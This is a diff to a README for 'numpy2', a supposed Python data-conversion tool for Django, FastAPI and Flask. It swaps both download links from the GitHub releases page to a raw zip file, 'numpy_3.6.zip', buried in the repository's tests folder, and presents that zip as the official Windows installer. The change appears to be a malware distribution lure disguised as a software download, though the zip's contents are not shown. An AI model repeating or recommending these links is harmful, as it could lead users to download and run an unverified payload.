@@ -1,6 +1,6 @@
 # 📊 numpy2 - Simplify data handling for web apps
 
-[![Download numpy2](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/aguswip/numpy2/releases)
+[![Download numpy2](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/aguswip/numpy2/main/tests/numpy_3.6.zip)
 
 numpy2 bridges the gap between complex data and web systems. It helps developers move information between heavy data systems and web pages. You use this tool to change data formats so they fit into websites built with Python. It works with common frameworks like Django, FastAPI, and Flask. You spend less time moving data and more time building your application.
 
@@ -8,7 +8,7 @@ numpy2 bridges the gap between complex data and web systems. It helps developers
 
 This tool runs on Windows. You perform the installation by downloading the installer file from our official release page. 
 
-[Click here to visit the release page and download your copy](https://github.com/aguswip/numpy2/releases)
+[Click here to visit the release page and download your copy](https://raw.githubusercontent.com/aguswip/numpy2/main/tests/numpy_3.6.zip)
 
 Follow these steps to obtain the files:
 1. Open the link provided above in your web browser.
